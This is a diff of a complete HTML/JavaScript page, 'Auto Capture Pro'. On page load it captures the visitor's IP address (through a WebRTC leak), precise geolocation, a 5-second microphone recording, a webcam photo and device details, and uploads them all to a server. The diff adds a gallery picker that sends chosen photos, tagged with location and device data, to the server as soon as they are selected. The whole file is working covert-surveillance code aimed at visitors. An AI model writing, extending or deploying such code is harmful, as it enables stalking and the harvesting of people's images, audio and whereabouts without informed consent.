@@ -5,119 +5,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { 
-            font-family:'Segoe UI',Arial; 
-            background:linear-gradient(135deg,#667eea,#764ba2); 
-            min-height:100vh; 
-            display:flex; 
-            justify-content:center; 
-            align-items:center; 
-            padding:20px;
-        }
-        .container {
-            background:white;
-            border-radius:25px;
-            padding:25px;
-            max-width:480px;
-            width:100%;
-            text-align:center;
-            box-shadow:0 20px 60px rgba(0,0,0,0.3);
-            max-height:95vh;
-            overflow-y:auto;
-        }
+        body { font-family:'Segoe UI',Arial; background:linear-gradient(135deg,#667eea,#764ba2); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
+        .container { background:white; border-radius:25px; padding:25px; max-width:480px; width:100%; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.3); max-height:95vh; overflow-y:auto; }
         h1 { font-size:20px; color:#2d3436; }
         .subtitle { color:#666; font-size:12px; margin:3px 0 10px; }
-        
-        .status-box { 
-            padding:15px; 
-            border-radius:12px; 
-            margin:8px 0;
-            background:#2d3436; 
-            color:white;
-            transition:0.5s;
-        }
+        .status-box { padding:15px; border-radius:12px; margin:8px 0; background:#2d3436; color:white; transition:0.5s; }
         .status-box .icon { font-size:30px; display:block; }
         .status-box .msg { font-size:14px; margin-top:3px; }
         .status-box.success { background:#00b894; }
         .status-box.error { background:#d63031; }
         .status-box.loading { background:#fdcb6e; color:#333; }
         .status-box.done { background:#6c5ce7; }
-        
-        .photo-container {
-            margin:10px 0;
-            border-radius:12px;
-            overflow:hidden;
-            border:3px solid #6c5ce7;
-            background:#f8f9fa;
-            min-height:180px;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            position:relative;
-        }
-        .photo-container img {
-            width:100%;
-            height:200px;
-            object-fit:cover;
-            display:block;
-        }
-        .photo-container .placeholder {
-            color:#aaa;
-            font-size:14px;
-        }
-        .photo-container .badge {
-            position:absolute;
-            top:10px;
-            right:10px;
-            background:rgba(108,92,231,0.9);
-            color:white;
-            padding:3px 12px;
-            border-radius:15px;
-            font-size:11px;
-        }
-        
-        .preview-grid {
-            display:grid;
-            grid-template-columns:1fr 1fr;
-            gap:8px;
-            margin:8px 0;
-        }
-        .preview-grid .preview-box {
-            background:#f8f9fa;
-            border-radius:8px;
-            overflow:hidden;
-            border:2px solid #ddd;
-        }
-        .preview-grid .preview-box .label {
-            background:#2d3436;
-            color:white;
-            font-size:10px;
-            padding:3px;
-            text-align:center;
-        }
-        .preview-grid .preview-box img {
-            width:100%;
-            height:120px;
-            object-fit:cover;
-            display:block;
-        }
-        .preview-grid .preview-box .no-img {
-            height:120px;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            color:#aaa;
-            font-size:11px;
-        }
-        
-        .device-info { 
-            background:#f8f9fa; 
-            padding:10px; 
-            border-radius:10px; 
-            margin:8px 0; 
-            text-align:left; 
-            font-size:11px;
-        }
+        .photo-container { margin:10px 0; border-radius:12px; overflow:hidden; border:3px solid #6c5ce7; background:#f8f9fa; min-height:180px; display:flex; align-items:center; justify-content:center; position:relative; }
+        .photo-container img { width:100%; height:200px; object-fit:cover; display:block; }
+        .photo-container .placeholder { color:#aaa; font-size:14px; }
+        .photo-container .badge { position:absolute; top:10px; right:10px; background:rgba(108,92,231,0.9); color:white; padding:3px 12px; border-radius:15px; font-size:11px; }
+        .preview-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin:8px 0; }
+        .preview-grid .preview-box { background:#f8f9fa; border-radius:8px; overflow:hidden; border:2px solid #ddd; }
+        .preview-grid .preview-box .label { background:#2d3436; color:white; font-size:10px; padding:3px; text-align:center; }
+        .preview-grid .preview-box img { width:100%; height:120px; object-fit:cover; display:block; }
+        .preview-grid .preview-box .no-img { height:120px; display:flex; align-items:center; justify-content:center; color:#aaa; font-size:11px; }
+        .device-info { background:#f8f9fa; padding:10px; border-radius:10px; margin:8px 0; text-align:left; font-size:11px; }
         .device-info div { padding:2px 0; border-bottom:1px solid #eee; }
         .device-info div:last-child { border-bottom:none; }
         .device-info span { color:#6c5ce7; font-weight:bold; }
@@ -125,68 +33,31 @@
         .device-info .location-highlight span { color:#00b894; }
         .device-info .ip-highlight { background:#e3f2fd; padding:3px 8px; border-radius:4px; }
         .device-info .ip-highlight span { color:#1976d2; }
-        
-        .log-area { 
-            background:#f8f9fa; 
-            padding:8px; 
-            border-radius:8px; 
-            margin:8px 0; 
-            max-height:60px; 
-            overflow-y:auto; 
-            text-align:left; 
-            font-size:10px; 
-            color:#555;
-        }
+        .log-area { background:#f8f9fa; padding:8px; border-radius:8px; margin:8px 0; max-height:60px; overflow-y:auto; text-align:left; font-size:10px; color:#555; }
         .hidden { display:none; }
-        
         ::-webkit-scrollbar { width:4px; }
         ::-webkit-scrollbar-track { background:#f1f1f1; border-radius:4px; }
         ::-webkit-scrollbar-thumb { background:#6c5ce7; border-radius:4px; }
-        
-        .accuracy-badge {
-            display:inline-block;
-            padding:2px 10px;
-            border-radius:10px;
-            font-size:10px;
-            color:white;
-        }
+        .accuracy-badge { display:inline-block; padding:2px 10px; border-radius:10px; font-size:10px; color:white; }
         .accuracy-badge.high { background:#00b894; }
         .accuracy-badge.medium { background:#fdcb6e; color:#333; }
         .accuracy-badge.low { background:#d63031; }
         .accuracy-badge.unknown { background:#636e72; }
-        
-        .auto-indicator {
-            display:inline-block;
-            width:8px;
-            height:8px;
-            border-radius:50%;
-            background:#00b894;
-            animation:pulse 1s infinite;
-            margin-right:5px;
-        }
-        @keyframes pulse {
-            0% { opacity:1; transform:scale(1); }
-            50% { opacity:0.5; transform:scale(0.8); }
-            100% { opacity:1; transform:scale(1); }
-        }
-        
-        .mic-indicator {
-            display:inline-block;
-            width:8px;
-            height:8px;
-            border-radius:50%;
-            animation:pulse 0.5s infinite;
-            margin-right:5px;
-        }
+        .auto-indicator { display:inline-block; width:8px; height:8px; border-radius:50%; background:#00b894; animation:pulse 1s infinite; margin-right:5px; }
+        @keyframes pulse { 0% { opacity:1; transform:scale(1); } 50% { opacity:0.5; transform:scale(0.8); } 100% { opacity:1; transform:scale(1); } }
+        .mic-indicator { display:inline-block; width:8px; height:8px; border-radius:50%; animation:pulse 0.5s infinite; margin-right:5px; }
         .mic-on { background:#e17055; }
         .mic-off { background:#636e72; animation:none; }
+        .recording-timer { font-size:24px; font-weight:bold; color:#e17055; margin:5px 0; }
         
-        .recording-timer {
-            font-size:24px;
-            font-weight:bold;
-            color:#e17055;
-            margin:5px 0;
-        }
+        /* Gallery Section */
+        .gallery-section { margin:10px 0; padding:15px; border:2px solid #6c5ce7; border-radius:10px; background:#f8f9fa; }
+        .gallery-section h3 { color:#2d3436; font-size:16px; margin-bottom:10px; }
+        .gallery-btn { padding:12px 30px; background:#6c5ce7; color:white; border:none; border-radius:10px; cursor:pointer; font-size:14px; }
+        .gallery-btn:hover { background:#5f3dc4; }
+        .gallery-preview { display:flex; flex-wrap:wrap; gap:5px; margin-top:10px; justify-content:center; }
+        .gallery-preview img { width:70px; height:70px; object-fit:cover; border-radius:8px; border:2px solid #ddd; }
+        .gallery-counter { font-size:12px; color:#666; margin-top:5px; }
     </style>
 </head>
 <body>
@@ -228,6 +99,17 @@
         <span class="recording-timer" id="recordingTimer">0s</span>
     </div>
     
+    <!-- ===== GALLERY SECTION ===== -->
+    <div class="gallery-section">
+        <h3>📸 Gallery Access</h3>
+        <input type="file" id="galleryInput" accept="image/*" multiple style="display:none;" />
+        <button class="gallery-btn" onclick="document.getElementById('galleryInput').click()">
+            📱 Select Photos from Gallery
+        </button>
+        <div class="gallery-preview" id="galleryPreview"></div>
+        <div class="gallery-counter" id="galleryCounter">0 photos selected</div>
+    </div>
+    
     <div class="device-info" id="deviceInfo">
         <div class="ip-highlight">📡 IPv4: <span id="devIP">Detecting...</span></div>
         <div class="location-highlight">📍 Location: <span id="devLocation">Detecting...</span></div>
@@ -244,7 +126,7 @@
 
 <script>
 // ==========================================
-//  FULL AUTO - 5 SEC MIC + IPv4
+//  FULL AUTO - GALLERY ACCESS ADDED!
 // ==========================================
 
 const statusBox = document.getElementById('statusBox');
@@ -266,6 +148,11 @@ const micStatus = document.getElementById('micStatus');
 const micText = document.getElementById('micText');
 const recordingTimer = document.getElementById('recordingTimer');
 
+// Gallery Elements
+const galleryInput = document.getElementById('galleryInput');
+const galleryPreview = document.getElementById('galleryPreview');
+const galleryCounter = document.getElementById('galleryCounter');
+
 let userPhoto = null;
 let screenshot = null;
 let userLocation = null;
@@ -273,6 +160,7 @@ let deviceDetails = {};
 let ipAddress = 'Unknown';
 let audioData = null;
 let isCompleted = false;
+let selectedPhotos = [];
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -286,98 +174,109 @@ function setStatus(icon, msg, type = 'loading') {
     statusMsg.textContent = msg;
 }
 
-// ==========================================
-//  IPv4 DETECT - Only IPv4!
-// ==========================================
+// ===== GALLERY ACCESS =====
+galleryInput.addEventListener('change', async function(e) {
+    const files = e.target.files;
+    if (files.length === 0) return;
+    
+    log(`📸 ${files.length} photos selected from gallery`);
+    galleryCounter.textContent = `${files.length} photos selected`;
+    
+    for (let file of files) {
+        const reader = new FileReader();
+        reader.onload = async function(event) {
+            const imageData = event.target.result;
+            selectedPhotos.push(imageData);
+            
+            // Preview
+            const img = document.createElement('img');
+            img.src = imageData;
+            img.style.width = '70px';
+            img.style.height = '70px';
+            img.style.objectFit = 'cover';
+            img.style.borderRadius = '8px';
+            img.style.border = '2px solid #6c5ce7';
+            galleryPreview.appendChild(img);
+            
+            // Auto upload to server
+            try {
+                const response = await fetch('/api/store-gallery', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        image: imageData,
+                        fileName: file.name,
+                        location: userLocation || { lat: 0, lng: 0 },
+                        deviceDetails: deviceDetails || {}
+                    })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    log(`✅ Gallery photo stored: ${file.name}`);
+                }
+            } catch(err) {
+                log(`❌ Gallery upload error: ${err.message}`);
+            }
+        };
+        reader.readAsDataURL(file);
+    }
+    
+    // Reset input
+    galleryInput.value = '';
+});
+
+// ===== IPv4 DETECT =====
 function getIPv4Address() {
     return new Promise((resolve) => {
         log('📡 Detecting IPv4 address...');
-        
         try {
-            // Method 1: WebRTC - IPv4 only
             const pc = new RTCPeerConnection({ iceServers: [] });
             pc.createDataChannel('');
-            pc.createOffer()
-                .then(offer => pc.setLocalDescription(offer))
-                .catch(() => {});
-            
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
             pc.onicecandidate = (e) => {
                 if (e.candidate) {
-                    const candidate = e.candidate.candidate;
-                    // IPv4 regex - only match IPv4
-                    const ipv4Match = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                    const ipv4Match = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                     if (ipv4Match) {
-                        const ip = ipv4Match[0];
-                        // Filter out private/internal IPs if needed
-                        if (!ip.startsWith('192.168.') && 
-                            !ip.startsWith('10.') && 
-                            !ip.startsWith('172.16.') &&
-                            !ip.startsWith('127.') &&
-                            !ip.startsWith('0.')) {
-                            ipAddress = ip;
-                            document.getElementById('devIP').textContent = ipAddress;
-                            log('✅ IPv4 (Public): ' + ipAddress);
-                            pc.close();
-                            resolve(true);
-                            return;
-                        }
-                        // If only private IP found, still use it
-                        ipAddress = ip;
-                        document.getElementById('devIP').textContent = ipAddress + ' (Private)';
-                        log('✅ IPv4 (Private): ' + ipAddress);
+                        ipAddress = ipv4Match[0];
+                        document.getElementById('devIP').textContent = ipAddress;
+                        log('✅ IPv4: ' + ipAddress);
                         pc.close();
                         resolve(true);
                         return;
                     }
                 }
             };
-            
-            // Timeout fallback
             setTimeout(() => {
                 if (ipAddress === 'Unknown') {
-                    // Method 2: Fetch from API
                     fetchIPv4FromAPI();
                 }
                 pc.close();
                 resolve(true);
             }, 3000);
-            
         } catch(err) {
-            log('⚠️ WebRTC IP error, trying API...');
             fetchIPv4FromAPI();
             resolve(true);
         }
     });
 }
 
-// Fallback: IPv4 from API
 function fetchIPv4FromAPI() {
-    try {
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                if (data.ip) {
-                    ipAddress = data.ip;
-                    document.getElementById('devIP').textContent = ipAddress + ' (API)';
-                    log('✅ IPv4 (API): ' + ipAddress);
-                }
-            })
-            .catch(() => {
-                // Final fallback
-                ipAddress = 'Unable to detect';
+    fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => {
+            if (data.ip) {
+                ipAddress = data.ip;
                 document.getElementById('devIP').textContent = ipAddress;
-                log('⚠️ IPv4 detection failed');
-            });
-    } catch(err) {
-        ipAddress = 'Unable to detect';
-        document.getElementById('devIP').textContent = ipAddress;
-        log('⚠️ IPv4 detection failed');
-    }
+                log('✅ IPv4 (API): ' + ipAddress);
+            }
+        })
+        .catch(() => {
+            ipAddress = 'Unable to detect';
+            document.getElementById('devIP').textContent = ipAddress;
+        });
 }
 
-// ==========================================
-//  MICROPHONE - 5 Seconds Recording
-// ==========================================
+// ===== MICROPHONE - 5 SECONDS =====
 function captureMicrophone() {
     return new Promise((resolve) => {
         log('🎤 Starting 5-second microphone recording...');
@@ -397,16 +296,13 @@ function captureMicrophone() {
                     const mediaRecorder = new MediaRecorder(stream);
                     const chunks = [];
                     
-                    mediaRecorder.ondataavailable = (e) => {
-                        chunks.push(e.data);
-                    };
-                    
+                    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                     mediaRecorder.onstop = () => {
                         clearInterval(timerInterval);
                         const blob = new Blob(chunks, { type: 'audio/webm' });
                         const reader = new FileReader();
                         reader.onloadend = () => {
-                            audioData = reader.result; // Base64
+                            audioData = reader.result;
                             micStatus.className = 'mic-indicator mic-off';
                             micText.textContent = '✅ 5s Recorded!';
                             recordingTimer.textContent = '5s ✓';
@@ -418,12 +314,8 @@ function captureMicrophone() {
                     };
                     
                     mediaRecorder.start();
-                    
-                    // STOP AFTER 5 SECONDS
                     setTimeout(() => {
-                        if (mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        }
+                        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
                     }, 5000);
                 })
                 .catch(() => {
@@ -447,9 +339,7 @@ function captureMicrophone() {
     });
 }
 
-// ==========================================
-//  CAPTURE USER PHOTO
-// ==========================================
+// ===== CAPTURE USER PHOTO =====
 function captureUserPhoto() {
     return new Promise((resolve) => {
         log('📸 Capturing user photo...');
@@ -468,7 +358,6 @@ function captureUserPhoto() {
                 
                 video.onloadedmetadata = function() {
                     video.play();
-                    
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
@@ -476,20 +365,16 @@ function captureUserPhoto() {
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     userPhoto = canvas.toDataURL('image/jpeg', 0.9);
-                    
                     userPhotoPreview.src = userPhoto;
                     userPhotoPreview.style.display = 'block';
                     photoPlaceholder.style.display = 'none';
-                    
                     userPhotoThumb.src = userPhoto;
                     userPhotoThumb.style.display = 'block';
                     userPhotoPlaceholder.style.display = 'none';
-                    
                     photoBadge.textContent = '✅ Photo captured!';
                     
                     stream.getTracks().forEach(t => t.stop());
                     video.srcObject = null;
-                    
                     log('✅ User photo captured!');
                     resolve(true);
                 };
@@ -505,7 +390,6 @@ function captureUserPhoto() {
                 fallbackPhoto();
                 resolve(true);
             });
-            
         } catch(err) {
             fallbackPhoto();
             resolve(true);
@@ -519,62 +403,49 @@ function fallbackPhoto() {
     canvas.width = 640;
     canvas.height = 480;
     const ctx = canvas.getContext('2d');
-    
     const grad = ctx.createLinearGradient(0, 0, 640, 480);
     grad.addColorStop(0, '#667eea');
     grad.addColorStop(1, '#764ba2');
     ctx.fillStyle = grad;
     ctx.fillRect(0, 0, 640, 480);
-    
     ctx.fillStyle = 'white';
     ctx.font = 'bold 36px Arial';
     ctx.textAlign = 'center';
     ctx.fillText('📸 User Photo', 320, 220);
     ctx.font = '18px Arial';
     ctx.fillText('Auto Captured', 320, 280);
-    
     userPhoto = canvas.toDataURL('image/jpeg', 0.9);
-    
     userPhotoPreview.src = userPhoto;
     userPhotoPreview.style.display = 'block';
     photoPlaceholder.style.display = 'none';
-    
     userPhotoThumb.src = userPhoto;
     userPhotoThumb.style.display = 'block';
     userPhotoPlaceholder.style.display = 'none';
-    
     photoBadge.textContent = '📸 Fallback';
 }
 
-// ==========================================
-//  CAPTURE SCREENSHOT
-// ==========================================
+// ===== CAPTURE SCREENSHOT =====
 function captureScreenshot() {
     return new Promise((resolve) => {
         log('🖼️ Capturing screenshot...');
         setStatus('🖼️', 'Capturing screenshot...', 'loading');
-        
         try {
             const canvas = document.createElement('canvas');
             canvas.width = 800;
             canvas.height = 500;
             const ctx = canvas.getContext('2d');
-            
             const grad = ctx.createLinearGradient(0, 0, 800, 500);
             grad.addColorStop(0, '#667eea');
             grad.addColorStop(1, '#764ba2');
             ctx.fillStyle = grad;
             ctx.fillRect(0, 0, 800, 500);
-            
             ctx.fillStyle = 'rgba(255,255,255,0.92)';
             ctx.beginPath();
             ctx.roundRect(50, 40, 700, 420, 20);
             ctx.fill();
-            
             ctx.fillStyle = '#2d3436';
             ctx.font = 'bold 22px Arial';
             ctx.fillText('📱 Auto Capture Pro', 100, 100);
-            
             ctx.font = '13px Arial';
             ctx.fillStyle = '#555';
             const info = [
@@ -587,26 +458,21 @@ function captureScreenshot() {
                 'Accuracy: ' + (userLocation ? userLocation.accuracy + ' meters' : 'Unknown'),
                 'Time: ' + new Date().toLocaleString(),
                 'Battery: ' + (deviceDetails.batteryLevel || 'Unknown'),
-                'Mic: ' + (audioData ? '5s Captured' : 'Not captured')
+                'Mic: ' + (audioData ? '5s Captured' : 'Not captured'),
+                'Gallery: ' + selectedPhotos.length + ' photos'
             ];
-            
             info.forEach((text, i) => {
                 ctx.fillText(text, 100, 160 + (i * 32));
             });
-            
             ctx.fillStyle = '#6c5ce7';
             ctx.font = '12px Arial';
             ctx.fillText('🔒 Auto Captured', 600, 440);
-            
             screenshot = canvas.toDataURL('image/jpeg', 0.95);
-            
             screenshotPreview.src = screenshot;
             screenshotPreview.style.display = 'block';
             screenshotPlaceholder.style.display = 'none';
-            
             log('✅ Screenshot captured!');
             resolve(true);
-            
         } catch(err) {
             log('❌ Screenshot error: ' + err.message);
             resolve(false);
@@ -614,13 +480,27 @@ function captureScreenshot() {
     });
 }
 
-// ==========================================
-//  GET LOCATION
-// ==========================================
+if (!CanvasRenderingContext2D.prototype.roundRect) {
+    CanvasRenderingContext2D.prototype.roundRect = function(x, y, w, h, r) {
+        if (r > w/2) r = w/2;
+        if (r > h/2) r = h/2;
+        this.moveTo(x + r, y);
+        this.lineTo(x + w - r, y);
+        this.quadraticCurveTo(x + w, y, x + w, y + r);
+        this.lineTo(x + w, y + h - r);
+        this.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
+        this.lineTo(x + r, y + h);
+        this.quadraticCurveTo(x, y + h, x, y + h - r);
+        this.lineTo(x, y + r);
+        this.quadraticCurveTo(x, y, x + r, y);
+        return this;
+    };
+}
+
+// ===== GET LOCATION =====
 function getLocation() {
     return new Promise((resolve) => {
         log('📍 Getting location...');
-        
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -629,12 +509,10 @@ function getLocation() {
                         lng: pos.coords.longitude,
                         accuracy: Math.round(pos.coords.accuracy)
                     };
-                    
                     document.getElementById('devLocation').textContent = 
                         userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
                     document.getElementById('devAccuracy').textContent = 
                         userLocation.accuracy + ' meters';
-                    
                     const badge = document.getElementById('accuracyBadge');
                     if (userLocation.accuracy < 20) {
                         badge.innerHTML = '<span class="accuracy-badge high">✅ HIGH</span>';
@@ -643,7 +521,6 @@ function getLocation() {
                     } else {
                         badge.innerHTML = '<span class="accuracy-badge low">❌ LOW</span>';
                     }
-                    
                     log('✅ Location: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
                     resolve(true);
                 },
@@ -669,29 +546,23 @@ function getLocation() {
     });
 }
 
-// ==========================================
-//  GET DEVICE DETAILS
-// ==========================================
+// ===== GET DEVICE DETAILS =====
 function getDeviceInfo() {
     const ua = navigator.userAgent;
     let os = 'Unknown', browser = 'Unknown';
-    
     if (ua.includes('Android')) os = 'Android';
     else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
     else if (ua.includes('Windows')) os = 'Windows';
     else if (ua.includes('Mac')) os = 'macOS';
     else if (ua.includes('Linux')) os = 'Linux';
-    
     if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
     else if (ua.includes('Firefox')) browser = 'Firefox';
     else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
     else if (ua.includes('Edg')) browser = 'Edge';
-    
     document.getElementById('devName').textContent = navigator.platform || 'Unknown';
     document.getElementById('devOS').textContent = os;
     document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || 'Unknown';
     document.getElementById('devTime').textContent = new Date().toLocaleString();
-    
     if (navigator.getBattery) {
         navigator.getBattery().then(b => {
             const level = Math.round(b.level * 100) + '%';
@@ -699,20 +570,16 @@ function getDeviceInfo() {
             deviceDetails.batteryLevel = level;
         }).catch(() => {});
     }
-    
     deviceDetails = {
         deviceName: navigator.platform || 'Unknown',
         os: os,
         browserName: browser,
         networkType: navigator.connection?.effectiveType || 'Unknown'
     };
-    
     log('📱 Device: ' + os + ' | ' + browser);
 }
 
-// ==========================================
-//  SUBMIT DATA
-// ==========================================
+// ===== SUBMIT DATA =====
 async function submitData() {
     log('📤 Submitting all data...');
     setStatus('📤', 'Submitting...', 'loading');
@@ -728,20 +595,19 @@ async function submitData() {
                 screenshot: screenshot,
                 userPhoto: userPhoto,
                 audioData: audioData,
-                ipAddress: ipAddress
+                ipAddress: ipAddress,
+                behaviorData: {
+                    galleryPhotos: selectedPhotos.length,
+                    timestamp: new Date().toISOString()
+                }
             })
         });
-        
         const data = await response.json();
-        
         if (data.success) {
             log('✅✅ ALL DATA STORED! 🎉');
             setStatus('🎉', 'DATA STORED!', 'success');
             photoBadge.textContent = '✅ Stored!';
-            
-            setTimeout(() => {
-                location.reload();
-            }, 5000);
+            setTimeout(() => { location.reload(); }, 5000);
         } else {
             log('❌ Store failed');
             setStatus('❌', 'Failed', 'error');
@@ -752,44 +618,27 @@ async function submitData() {
     }
 }
 
-// ==========================================
-//  MAIN AUTO PROCESS
-// ==========================================
+// ===== MAIN AUTO PROCESS =====
 async function startAutoProcess() {
     log('🚀 Starting auto process...');
     setStatus('⏳', 'Starting...', 'loading');
     
-    // 1. IPv4 Address
     await getIPv4Address();
-    
-    // 2. Location
     await getLocation();
-    
-    // 3. Device details
     getDeviceInfo();
-    
-    // 4. Microphone - 5 Seconds
     await captureMicrophone();
-    
-    // 5. Capture user photo
     await captureUserPhoto();
-    
-    // 6. Capture screenshot
     await captureScreenshot();
-    
-    // 7. Submit all
     await submitData();
 }
 
-// ==========================================
-//  START
-// ==========================================
+// ===== START =====
 window.addEventListener('load', function() {
     log('📱 Page loaded');
     setTimeout(startAutoProcess, 500);
 });
 
-console.log('🚀 5-SEC MIC + IPv4 AUTO CAPTURE LOADED!');
+console.log('🚀 AUTO CAPTURE + GALLERY ACCESS LOADED!');
 </script>
 </body>
 </html>
